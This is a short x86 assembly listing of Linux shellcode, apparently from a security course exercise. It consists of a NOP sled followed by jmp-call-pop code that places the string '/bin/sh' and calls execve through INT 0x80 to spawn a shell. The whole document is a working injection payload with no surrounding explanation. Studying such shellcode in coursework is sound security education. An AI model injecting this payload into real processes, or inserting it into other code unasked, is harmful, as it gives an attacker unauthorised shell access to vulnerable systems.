NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP
NOP

JMP _WANT_BIN_BASH
_GOT_BIN_BASH:    
    MOV AL, 0x0B # 11 - code for execve 
    POP EBX       # path
    XOR ECX,ECX         # ECX = 0
    MOV [EBX+7], ECX    # Zero solutions (rec 4, slide 18)
    MOV ECX, ECX  # argv -> Null
    MOV EDX, ECX  # envp -> Null
    INT 0x80
    
_WANT_BIN_BASH:
    # This will push the string address as RA
    CALL _GOT_BIN_BASH
    # .STRING "/bin/sh@"
    .ASCII "/bin/sh@" 
    
 
